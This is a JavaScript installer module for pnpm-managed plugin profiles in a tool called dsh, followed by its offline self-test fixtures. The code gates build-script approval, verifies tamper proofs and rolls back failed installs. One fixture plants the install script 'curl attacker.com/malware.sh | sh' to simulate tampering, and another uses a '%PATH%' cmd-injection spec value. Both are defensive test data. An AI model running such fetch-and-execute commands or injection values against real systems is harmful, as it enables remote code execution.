      return { status: "failed", detail: `retry could not start pnpm: ${retryOutcome.spawnError.message}` };
    }
    if (retryOutcome.exitCode === null) {
      return { status: "killed", detail: retryOutcome.signal ? `signal: ${retryOutcome.signal}` : "killed before exit" };
    }
    if (retryOutcome.exitCode === 0) {
      return tryFinalize();
    }
    return { status: "failed", detail: `pnpm add ${spec} still failed after allowing build scripts (exit code ${retryOutcome.exitCode}). See job output.` };
  };

  const first = spawnAdd();
  current = first;
  const done = first.done
    .then((outcome) => settle(outcome))
    .catch((error) => {
      restoreOriginalWorkspace();
      return {
        status: "failed",
        detail: `install of ${spec} hit an internal error: ${error?.message ?? String(error)}`,
      };
    })
    .then((result) => {
      if (!restoreOriginalWorkspace()) {
        result = {
          status: "failed",
          detail: `pnpm-workspace.yaml restoration failed (${workspaceRestoreError?.message ?? "unknown error"}); refusing to finalize and rolling the profile back`,
        };
      }
      if (result.status === "completed") {
        // Keep the marker as-is
      } else {
        try {
          rollbackPendingSnapshot(profileDir);
          push("\n[dsh-plugin-mall] install did not complete — restored profile files to their pre-install state and cleared the pending marker\n");
        } catch (error) {
          push(`\n[dsh-plugin-mall] WARNING: could not roll back the pending snapshot: ${error.message}\n`);
        }
      }
      return result;
    });

  return {
    cancel: () => {
      cancelSpawned(current);
    },
    done,
    readOutput: () => {
      if (deltaQueue.length === 0) return "";
      return deltaQueue.splice(0).join("");
    },
  };
}

// ── the background uninstall job ────────────────────────────────────────────

/** A terminal producer for fast-fail cases (no pnpm spawn needed). */
function failedNow(detail) {
  return {
    cancel: () => {},
    done: Promise.resolve({ status: "failed", detail }),
    readOutput: () => "",
  };
}

/**
 * Run `pnpm remove <package>` in the profile directory as a job producer with
 * the same shape as `runInstall`. On success it reconciles
 * `dsh.profile.bundles` (the removed dependency's bundle entry drops out) and
 * deletes the client loader row `ensureClientRow` had registered for it.
 */
export function runRemove({ profile, packageName, _profileDir, _spawn }) {
  // Same per-profile queue as runInstall — a remove must never run
  // concurrently with an install (or another remove) in the same profile.
  return serializedProducer(_profileDir ?? profileLockKey(profile), () =>
    runRemoveInner({ profile, packageName, _profileDir, _spawn }, false));
}

function runRemoveInner({ profile, packageName, _profileDir, _spawn }, selfHealed) {
  let profileDir;
  if (_profileDir !== undefined) {
    profileDir = _profileDir;
  } else {
    try {
      profileDir = resolveProfileDir(profile);
    } catch (error) {
      return failedNow(`invalid profile: ${error.message}`);
    }
  }
  // Fail closed: an unresolved install transaction (pending marker) owns this
  // profile until startup/CLI recovery commits or rolls it back. Removing
  // packages underneath it would corrupt the state the marker protects.
  // Existence-only, like markPendingSnapshot: a corrupt marker blocks just as
  // hard as a valid one, and is left untouched for the recovery path.
  const markerPath = pendingMarkerPath(profileDir);
  if (existsSync(markerPath)) {
    return failedNow(`profile "${profile}" has a pending install transaction (${markerPath}) — refusing to remove ${packageName} until it is resolved; restart dsh (startup recovery) or run \`dsh-plugin-guard guard recover\` first`);
  }
  const manifestPath = join(profileDir, "package.json");
  if (!existsSync(manifestPath)) {
    return failedNow(`profile "${profile}" has no package.json — nothing installed to remove`);
  }
  const beforeDeps = new Set(Object.keys(readManifest(profileDir).dependencies ?? {}));
  if (!beforeDeps.has(packageName)) {
    return failedNow(`"${packageName}" is not a dependency of profile "${profile}" (installed: ${[...beforeDeps].join(", ") || "none"})`);
  }
  const deltaQueue = [];
  const push = (text) => {
    deltaQueue.push(text);
  };
  let current = undefined;

  const plan = _spawn === undefined ? pnpmSpawnPlan() : { command: "pnpm", shell: false, treeKill: false };
  const proc = (_spawn ?? spawn)(plan.command, ["remove", packageName, "--reporter=append-only"], {
    cwd: profileDir,
    env: process.env,
    shell: plan.shell,
    stdio: ["ignore", "pipe", "pipe"],
    windowsHide: true,
  });
  current = { proc, treeKill: plan.treeKill };
  const done = new Promise((resolve) => {
    proc.on("error", (error) => resolve({ spawnError: error }));
    proc.on("close", (exitCode) => resolve({ exitCode, signal: proc.signalCode }));
  }).then(async (outcome) => {
    if (outcome.spawnError !== undefined) {
      // pnpm 缺失时先 corepack 自愈一次再重试（重试复用同一个队列内的
      // producer——若走 runRemove 重新排队会死锁——且必须返回它的 done
      // outcome，返回 producer 本体会让 tracker 把成功任务记成 failed）。
      if (outcome.spawnError.code === "ENOENT" && selfHealed !== true) {
        const healed = await enablePnpmViaCorepack(push);
        if (healed) return await runRemoveInner({ profile, packageName, _profileDir, _spawn }, true).done;
      }
      const hint = outcome.spawnError.code === "ENOENT"
        ? "pnpm not found on PATH — install pnpm (e.g. `corepack enable pnpm`) to manage profile plugins"
        : `could not start pnpm: ${outcome.spawnError.message}`;
      return { status: "failed", detail: hint };
    }
    if (outcome.exitCode === null) {
      return { status: "killed", detail: outcome.signal ? `signal: ${outcome.signal}` : "killed before exit" };
    }
    if (outcome.exitCode !== 0) {
      return { status: "failed", detail: `pnpm remove ${packageName} failed (exit code ${outcome.exitCode}). See job output.` };
    }
    // 卸完后的对账（bundle 列表、client 行）抛错也必须落成 terminal failed，
    // 不能让 done 拒绝。
    try {
      const bundles = reconcileBundles(profileDir, beforeDeps);
      const clientRow = removeClientRow(profileDir, packageName);
      const notes = [`bundle layer(s) now: ${bundles.join(", ") || "none (template only)"}`];
      if (clientRow.removed) notes.push(`removed client loader row "${clientRow.rowId}" from cordis.patch.yml`);
      return { status: "completed", detail: `removed ${packageName} from profile "${profile}" — ${notes.join("; ")}. Restart dsh for the change to take effect.` };
    } catch (error) {
      return { status: "failed", detail: `pnpm removed ${packageName} but post-remove reconciliation failed: ${error?.message ?? String(error)}` };
    }
  }).catch((error) => ({ status: "failed", detail: `remove of ${packageName} hit an internal error: ${error?.message ?? String(error)}` }));
  proc.stdout?.on("data", (data) => push(data.toString()));
  proc.stderr?.on("data", (data) => push(data.toString()));

  return {
    cancel: () => {
      cancelSpawned(current);
    },
    done,
    readOutput: () => {
      if (deltaQueue.length === 0) return "";
      return deltaQueue.splice(0).join("");
    },
  };
}

// ── offline fixtures ────────────────────────────────────────────────────────
//
// mergeAllowBuilds is the text surgery that bricked a profile: it appended a
// YAML sequence item under a key pnpm had already written as a mapping, and
// the resulting file parsed nowhere, so every later pnpm operation in that
// profile failed until it was repaired by hand. These cases pin every shape it
// can meet. Run them from an INSTALLED copy (the bare imports at the top of
// this file resolve through the host, not through a bare checkout):
//   node ~/.dsh/profiles/web/node_modules/@1e0zj/dsh-plugin-mall/src/installer.js --self-test
const BASE_WS = "packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n";

const ALLOW_BUILDS_FIXTURES = [
  {
    label: "没有 allowBuilds —— 新建，用 pnpm 自己的映射格式",
    content: BASE_WS,
    names: ["node-pty"],
    check: (out) => load(out).allowBuilds?.["node-pty"] === true,
  },
  {
    label: "pnpm 的未决占位符 —— 改写成 true，而不是当作已放行跳过",
    content: `${BASE_WS}allowBuilds:\n  node-pty: set this to true or false\n`,
    names: ["node-pty"],
    check: (out) => load(out).allowBuilds?.["node-pty"] === true,
  },
  {
    label: "已有映射条目 —— 追加同为映射，不混格式",
    content: `${BASE_WS}allowBuilds:\n  esbuild: true\n`,
    names: ["node-pty"],
    check: (out) => { const a = load(out).allowBuilds; return a?.esbuild === true && a?.["node-pty"] === true; },
  },
  {
    label: "已有序列条目 —— 追加同为序列，不混格式（正是砖化那次的形状）",
    content: `${BASE_WS}allowBuilds:\n  - 'esbuild'\n`,
    names: ["node-pty"],
    check: (out) => { const a = load(out).allowBuilds; return Array.isArray(a) && a.includes("esbuild") && a.includes("node-pty"); },
  },
  {
    label: "序列里已存在 —— 无需改动",
    content: `${BASE_WS}allowBuilds:\n  - 'node-pty'\n`,
    names: ["node-pty"],
    expectNoChange: true,
  },
  {
    label: "映射里已是 true —— 无需改动",
    content: `${BASE_WS}allowBuilds:\n  node-pty: true\n`,
    names: ["node-pty"],
    expectNoChange: true,
  },
  {
    label: "scoped 包名在序列里要加引号（@ 是 YAML 保留指示符）",
    content: `${BASE_WS}allowBuilds:\n  - 'esbuild'\n`,
    names: ["@scope/native-thing"],
    check: (out) => load(out).allowBuilds?.includes("@scope/native-thing"),
  },
  {
    label: "allowBuilds 后面还有别的 key —— 不插到别人块里",
    content: `packages:\n  - .\n\nallowBuilds:\n  esbuild: true\n\nnodeLinker: hoisted\n`,
    names: ["node-pty"],
    check: (out) => { const d = load(out); return d.allowBuilds?.["node-pty"] === true && d.nodeLinker === "hoisted"; },
  },
  {
    label: "非法包名被过滤，无合法名时不动文件",
    content: BASE_WS,
    names: ["9 | - pkg", "Run \"pnpm approve-builds\""],
    expectNoChange: true,
  },
  {
    label: "文件本来就坏 —— 拒绝编辑，不让它更坏",
    content: "allowBuilds:\n  - 'a'\n  a: b\n",
    names: ["node-pty"],
    expectThrow: true,
  },
];

function runAllowBuildsFixtures() {
  let failed = 0;
  for (const fx of ALLOW_BUILDS_FIXTURES) {
    let out, error;
    try { out = mergeAllowBuilds(fx.content, fx.names); } catch (e) { error = e; }
    let ok;
    if (fx.expectThrow) ok = error !== undefined;
    else if (error !== undefined) ok = false;
    else if (fx.expectNoChange) ok = out === undefined;
    else ok = out !== undefined && (() => { try { return fx.check(out) === true; } catch { return false; } })();
    // 任何产出都必须是可解析的 YAML —— 这是这组用例存在的全部理由。
    if (ok && out !== undefined) {
      try { load(out); } catch { ok = false; }
    }
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} ${fx.label}`);
    if (!ok && out !== undefined) console.log(`       产出:\n${out.split("\n").map((l) => `       | ${l}`).join("\n")}`);
    if (!ok && error !== undefined) console.log(`       抛错: ${error.message}`);
  }
  return failed;
}

// ── transaction fixtures (deterministic, offline) ───────────────────────────
//
// The findings these pin:
//   1. pnpm exiting 0 while printing "Ignored build scripts" must NOT
//      finalize success — the approval gate applies to successful output too.
//   2. An exception in finalizeSuccess must become a terminal failed outcome
//      WITH rollback — done resolves exactly once, never rejects.
//   3. add/remove are serialized per profile; remove fails closed while a
//      pending marker exists; cancel while queued never spawns pnpm.
//   4. The spawn plan resolves pnpm without a shell where possible, and a
//      cancelled install rolls back only after the process exited.
// They drive runInstall/runRemove through the `_profileDir`/`_spawn`/
// `_describe` seams against temp profiles (<tmp>/home/profiles/p), so no real
// profile, pnpm, or network is involved.

/** Minimal fake ChildProcess: stdout/stderr emitters, kill(), manual finish. */
class FakeProc extends EventEmitter {
  constructor() {
    super();
    this.stdout = new EventEmitter();
    this.stderr = new EventEmitter();
    this.pid = 424242;
    this.signalCode = null;
  }
  kill() {
    queueMicrotask(() => {
      this.signalCode = "SIGTERM";
      this.emit("close", null, "SIGTERM");
    });
  }
  finish(code, out = "") {
    queueMicrotask(() => {
      if (out.length > 0) this.stdout.emit("data", Buffer.from(out));
      this.emit("close", code);
    });
  }
}

/** Spawn fake consuming scripted {code, out, beforeExit} steps; records calls. */
function scriptedSpawn(steps) {
  const calls = [];
  const spawnFn = (command, args, options) => {
    calls.push({ command, args, options });
    const proc = new FakeProc();
    const step = steps[calls.length - 1];
    if (step === undefined) proc.finish(1, "unexpected extra spawn");
    else {
      step.beforeExit?.();
      proc.finish(step.code, step.out ?? "");
    }
    return proc;
  };
  return { spawnFn, calls };
}

/** Spawn fake whose procs stay alive until the test finishes them. */
function blockingSpawn() {
  const procs = [];
  const spawnFn = () => {
    const proc = new FakeProc();
    procs.push(proc);
    return proc;
  };
  return { spawnFn, procs };
}

/** Temp profile at <tmp>/home/profiles/p — guard home resolves to <tmp>/home/guard. */
function makeTempProfile(label, dependencies = {}) {
  const home = mkdtempSync(join(tmpdir(), `dsh-mall-selftest-${label}-`));
  const profileDir = join(home, "profiles", "p");
  mkdirSync(profileDir, { recursive: true });
  const manifest = JSON.stringify({ name: "p", dependencies }, undefined, 2) + "\n";
  writeFileSync(join(profileDir, "package.json"), manifest);
  return { home, profileDir, manifest, cleanup: () => rmSync(home, { recursive: true, force: true }) };
}

function materializeFakePackage(profileDir, name, version = "1.0.0", scripts = {}, files = { "index.js": "module.exports = {};\n" }) {
  const pkgDir = join(profileDir, "node_modules", ...name.split("/"));
  mkdirSync(pkgDir, { recursive: true });
  const manifest = { name, version, scripts };
  writeFileSync(join(pkgDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
  for (const [relPath, content] of Object.entries(files)) {
    const full = join(pkgDir, relPath);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return pkgDir;
}

const describeStub = async (missing) => missing.map((entry) => ({ ...entry, direct: true, scripts: {} }));

// 回滚校验要求 marker 能指认候选包（guard.js sanitizeSnapshot），生产环境由
// preflight 报告带来；fixtures 给同名存根。
const preflightStub = (name) => ({ candidate: { name } });

async function runTransactionFixtures() {
  let failed = 0;
  const check = (label, ok, extra) => {
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} ${label}`);
    if (!ok && extra !== undefined) console.log(`       ${extra}`);
  };
  const tick = () => new Promise((resolve) => setTimeout(resolve, 1));
  const flush = async (rounds = 5) => { for (let index = 0; index < rounds; index++) await tick(); };

  // 纯函数前置：spec 黑名单。`%` 必须在内——cmd 的 %VAR% 展开元字符，
  // 展开值里的分号/空格足以重塑 argv；三处黑名单曾漂移（cli.js 一直有，
  // installer/guard 漏过）。
  {
    const rejects = (value) => {
      try { assertSafeSpec(value); return false; } catch { return true; }
    };
    check("assertSafeSpec：cmd 的 %VAR% 展开元字符被拒绝", rejects("evil-pkg%PATH%"));
    check("assertSafeSpec：正常 spec 不受影响", !rejects("some-plugin@1.0.0") && !rejects("github:owner/repo"));
  }

  // 0. hashPackageTree 确定性与符号链接越界防御
  {
    const tempDir = mkdtempSync(join(tmpdir(), "dsh-mall-selftest-hash-"));
    try {
      materializeFakePackage(tempDir, "test-pkg", "1.0.0", { postinstall: "node test.js" }, { "a.js": "const a = 1;\n", "b.js": "const b = 2;\n" });
      const pkgPath = join(tempDir, "node_modules", "test-pkg");
      const hash1 = hashPackageTree(pkgPath);
      const hash2 = hashPackageTree(pkgPath);
      check("hashPackageTree 确定性（内容不变哈希相同）", typeof hash1 === "string" && hash1.length === 64 && hash1 === hash2);

      // 修改文件内容哈希改变
      writeFileSync(join(pkgPath, "a.js"), "const a = 999;\n");
      const hash3 = hashPackageTree(pkgPath);
      check("包内文件修改 → hashPackageTree 哈希变化", hash1 !== hash3);

      // Bundled dependencies live below the package's own node_modules and
      // may contain lifecycle helpers/native loaders. They are artifact bytes,
      // not the profile's dependency tree, so changing them must invalidate
      // the approval proof as well.
      const bundledDir = join(pkgPath, "node_modules", "bundled-helper");
      mkdirSync(bundledDir, { recursive: true });
      writeFileSync(join(bundledDir, "package.json"), '{"name":"bundled-helper","version":"1.0.0"}\n');
      writeFileSync(join(bundledDir, "loader.js"), "safe();\n");
      const bundledHash1 = hashPackageTree(pkgPath);
      writeFileSync(join(bundledDir, "loader.js"), "malicious();\n");
      const bundledHash2 = hashPackageTree(pkgPath);
      check("包内 bundled node_modules 字节变化 → artifact hash 变化", bundledHash1 !== bundledHash2);

      // 符号链接/Junction 越界防御
      const outsideDir = mkdtempSync(join(tmpdir(), "dsh-mall-outside-"));
      try {
        writeFileSync(join(outsideDir, "secret.txt"), "secret");
        let escapeDetected = false;
        try {
          const { symlinkSync } = await import("node:fs");
          try {
            symlinkSync(outsideDir, join(pkgPath, "link-outside-dir"), "junction");
          } catch {
            symlinkSync(join(outsideDir, "secret.txt"), join(pkgPath, "link-outside.txt"));
          }
          hashPackageTree(pkgPath);
        } catch (err) {
          escapeDetected = /symlink escape/.test(err.message);
        }
        check("hashPackageTree 符号链接越界防御（拒绝越界 symlink）", escapeDetected);
      } finally {
        rmSync(outsideDir, { recursive: true, force: true });
      }
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  }

  // 1a. exit 0 + "Ignored build scripts" 且未批准：必须停在批准闸（failed +
  // needsApproval），携带 proof，绝不 finalize，回滚收掉 marker，且只 spawn 一次。
  {
    const { profileDir, cleanup } = makeTempProfile("ignored-gate");
    try {
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const { spawnFn, calls } = scriptedSpawn([{ code: 0, out: "Packages are cloned\nIgnored build scripts: node-pty@1.0.0\nDone\n" }]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        // Deliberately stale/malicious registry data. The approval disclosure
        // must still use the manifest and bytes from the materialized tree.
        _describe: async () => [{
          name: "node-pty",
          version: "1.0.0",
          direct: true,
          scripts: { install: "registry lied" },
          contentHash: "0".repeat(64),
          weeklyDownloads: 123,
        }],
      });
      const outcome = await producer.done;
      check(
        "退出码 0 + Ignored build scripts（未批准）→ 停在批准闸，返回 proof，不 finalize",
        outcome.status === "failed"
          && Array.isArray(outcome.needsApproval)
          && outcome.needsApproval.some((entry) => entry.name === "node-pty")
          && outcome.proof !== undefined
          && outcome.proof.candidate.name === "some-plugin"
          && outcome.proof.blockedPackages.some((e) => e.name === "node-pty")
          && outcome.needsApproval.some((entry) => entry.name === "node-pty"
            && entry.version === "1.0.0"
            && entry.scripts?.install === "node install.js"
            && entry.contentHash === outcome.proof.blockedPackages.find((proofEntry) => proofEntry.name === "node-pty")?.contentHash
            && entry.contentHash !== "0".repeat(64)
            && entry.weeklyDownloads === 123)
          && calls.length === 1
          && !existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} calls=${calls.length} marker=${existsSync(pendingMarkerPath(profileDir))}`,
      );
      const call = calls[0] ?? { args: [], options: {} };
      check(
        "实装 argv/env：strict-dep-builds + peer 关闭 + cwd/shell 正确",
        JSON.stringify(call.args) === JSON.stringify(liveAddArgs("some-plugin"))
          && call.args.includes("--config.strict-dep-builds=true")
          && call.args.includes("--config.auto-install-peers=false")
          && call.options.env?.npm_config_strict_dep_builds === "true"
          && call.options.env?.NPM_CONFIG_STRICT_DEP_BUILDS === "true"
          && call.options.env?.npm_config_auto_install_peers === "false"
          && call.options.cwd === profileDir
          && call.options.shell === false,
        JSON.stringify({ args: call.args, shell: call.options?.shell, cwd: call.options?.cwd }),
      );
    } finally {
      cleanup();
    }
  }

  // 1b. exit 0 + Ignored build scripts 且已点名批准 + approvedProof 匹配：
  // 写 allowBuilds 重试一次，重试输出干净才 finalize；成功后 workspace 原样还原，保留 pending marker。
  {
    const { profileDir, cleanup } = makeTempProfile("ignored-approved");
    try {
      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);

      let temporaryApprovedWorkspace;
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        {
          code: 0,
          out: "Done\n",
          beforeExit: () => {
            temporaryApprovedWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
          },
        },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "退出码 0 + Ignored build scripts（已批准+proof 匹配）→ 重试成功，workspace 字节还原（不残留 allowBuilds），marker 保留",
        outcome.status === "completed"
          && calls.length === 2
          && calls[1].args[0] === "rebuild"
          && calls[1].args.includes("node-pty")
          && !calls[1].args.includes("some-plugin")
          && temporaryApprovedWorkspace?.allowBuilds?.["node-pty@1.0.0"] === true
          && temporaryApprovedWorkspace?.dangerouslyAllowAllBuilds === false
          && Array.isArray(temporaryApprovedWorkspace?.onlyBuiltDependencies)
          && temporaryApprovedWorkspace.onlyBuiltDependencies.length === 0
          && finalWs === initialWs
          && existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} calls=${calls.length} finalWs=${JSON.stringify(finalWs)} marker=${existsSync(pendingMarkerPath(profileDir))}`,
      );
    } finally {
      cleanup();
    }
  }

  // 1c. 攻击防御：批准后修改 postinstall / 文件内容 → retry 时 proof 校验失败，绝不重试并回滚
  {
    const { profileDir, cleanup } = makeTempProfile("attack-tampered-proof");
    try {
      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node safe-install.js" });
      const originalProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);

      // 模拟攻击者在审批之后篡改了 node-pty 的 install 脚本和文件
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "curl attacker.com/malware.sh | sh" }, { "malware.js": "evil();\n" });

      const maliciousRan = join(profileDir, "MALICIOUS_RAN");
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        { code: 0, out: "Done\n", beforeExit: () => writeFileSync(maliciousRan, "bad\n") },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "file:../same-mutable-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof: originalProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "攻击防御：同名包篡改脚本/内容后重试 → proof 不匹配立即拒绝，不触发二次 spawn，workspace/profile 回滚",
        outcome.status === "failed"
          && /security verification failed/.test(outcome.detail ?? "")
          && calls.length === 1
          && !existsSync(maliciousRan)
          && finalWs === initialWs
          && !existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} calls=${calls.length} detail=${outcome.detail}`,
      );
    } finally {
      cleanup();
    }
  }

  // 1d. 攻击防御：profile 预先存在的 allowBuilds: true 无法绕过首次审批警告
  {
    const { profileDir, cleanup } = makeTempProfile("bypass-preexisting-allow");
    try {
      const initialWs = "packages:\n  - .\n\nallowBuilds:\n  evil-script-pkg: true\nonlyBuiltDependencies:\n  - evil-script-pkg\ndangerouslyAllowAllBuilds: true\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "evil-script-pkg", "1.0.0", { postinstall: "node evil.js" });

      let firstProbeWorkspace;
      const { spawnFn, calls } = scriptedSpawn([
        {
          code: 0,
          out: "Ignored build scripts: evil-script-pkg@1.0.0\n",
          beforeExit: () => {
            firstProbeWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
          },
        },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "攻击防御：预先存在的 allowBuilds 在首轮被中和 → 依然触发审批闸，且事后恢复用户原本的 workspace 字节",
        outcome.status === "failed"
          && Array.isArray(outcome.needsApproval)
          && outcome.needsApproval.some((e) => e.name === "evil-script-pkg")
          && calls.length === 1
          && Object.keys(firstProbeWorkspace?.allowBuilds ?? {}).length === 0
          && Array.isArray(firstProbeWorkspace?.onlyBuiltDependencies)
          && firstProbeWorkspace.onlyBuiltDependencies.length === 0
          && firstProbeWorkspace?.dangerouslyAllowAllBuilds === false
          && finalWs === initialWs,
        `status=${outcome.status} calls=${calls.length} finalWs=${JSON.stringify(finalWs)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 1d-2. package.json can carry the same build authorization independently
  // of pnpm-workspace.yaml. Refuse every known positive form before spawning.
  {
    const policies = [
      { pnpm: { allowBuilds: { "evil-script-pkg": true } } },
      { pnpm: { onlyBuiltDependencies: ["evil-script-pkg"] } },
      { pnpm: { dangerouslyAllowAllBuilds: true } },
      { dependenciesMeta: { "evil-script-pkg": { built: true } } },
    ];
    let allRejected = true;
    const details = [];
    for (let index = 0; index < policies.length; index++) {
      const { profileDir, cleanup } = makeTempProfile(`manifest-preauth-${index}`);
      try {
        const manifest = { name: "p", dependencies: {}, ...policies[index] };
        writeFileSync(join(profileDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
        const { spawnFn, calls } = scriptedSpawn([]);
        const outcome = await runInstall({
          profile: "p",
          spec: "some-plugin",
          preflight: preflightStub("some-plugin"),
          _profileDir: profileDir,
          _spawn: spawnFn,
        }).done;
        const rejected = outcome.status === "failed"
          && /pre-authorizes|would bypass/.test(outcome.detail ?? "")
          && calls.length === 0
          && !existsSync(pendingMarkerPath(profileDir));
        allRejected &&= rejected;
        if (!rejected) details.push(`${index}:${outcome.status}:${outcome.detail}:calls=${calls.length}`);
      } finally {
        cleanup();
      }
    }
    check("package.json 四种预授权策略均在 pnpm spawn 前 fail closed", allRejected, details.join(" | "));
  }

  // 1e. 无论是安装失败、重试失败还是成功，workspace 原始字节均完整还原（不破坏用户已有策略）
  {
    const { profileDir, cleanup } = makeTempProfile("ws-restore-on-failure");
    try {
      const userCustomWs = "packages:\n  - .\n\nallowBuilds:\n  user-custom-tool: true\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), userCustomWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);

      // 重试执行失败
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        { code: 1, out: "Build error\n" },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "重试执行失败 → workspace 依然完整恢复用户的 user-custom-tool 策略",
        outcome.status === "failed" && calls.length === 2 && finalWs === userCustomWs,
        `status=${outcome.status} calls=${calls.length} detail=${JSON.stringify(outcome.detail)} finalWs=${JSON.stringify(finalWs)}`,
      );
    } finally {
      cleanup();
    }
  }


  // 1f. Even when an approved rebuild itself succeeds, inability to put the
  // user's exact workspace bytes back is terminal and forces snapshot rollback.
  {
    const { profileDir, manifest, cleanup } = makeTempProfile("ws-restore-hard-fail");
    try {
      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        { code: 0, out: "Done\n" },
      ]);
      const outcome = await runInstall({
        profile: "p",
        spec: "some-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
        _restoreWorkspace: () => { throw new Error("simulated restore denial"); },
      }).done;
      check(
        "workspace 恢复写失败 → 即使 rebuild exit 0 也 terminal failed 并回滚 marker/profile",
        outcome.status === "failed"
          && /restor|恢复|workspace/i.test(outcome.detail ?? "")
          && calls.length === 2
          && readFileSync(join(profileDir, "package.json"), "utf8") === manifest
          && readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8") === initialWs
          && !existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)} calls=${calls.length}`,
      );
    } finally {
      cleanup();
    }
  }

  // 2. finalizeSuccess 抛错（pnpm 留下了坏 manifest）：归一成 failed、回滚
  // 恢复字节并收掉 marker、done 恰好结算一次且不拒绝。
  {
    const { profileDir, manifest, cleanup } = makeTempProfile("finalize-throws");
    try {
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      const { spawnFn } = scriptedSpawn([{
        code: 0,
        out: "Done\n",
        beforeExit: () => writeFileSync(join(profileDir, "package.json"), "{ broken json"),
      }]);
      const producer = runInstall({ profile: "p", spec: "some-plugin", preflight: preflightStub("some-plugin"), _profileDir: profileDir, _spawn: spawnFn, _describe: describeStub });
      let settlements = 0;
      void producer.done.then(() => { settlements++; });
      const outcome = await producer.done;
      await flush();
      check(
        "finalize 抛错 → failed + 回滚恢复 package.json + marker 收掉 + 单次结算",
        outcome.status === "failed"
          && /reconciliation failed/.test(outcome.detail ?? "")
          && readFileSync(join(profileDir, "package.json"), "utf8") === manifest
          && !existsSync(pendingMarkerPath(profileDir))
          && settlements === 1,
        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)} settlements=${settlements}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3a. 串行化：install 在跑时 remove 排队，不许并发 spawn；install 失败回滚
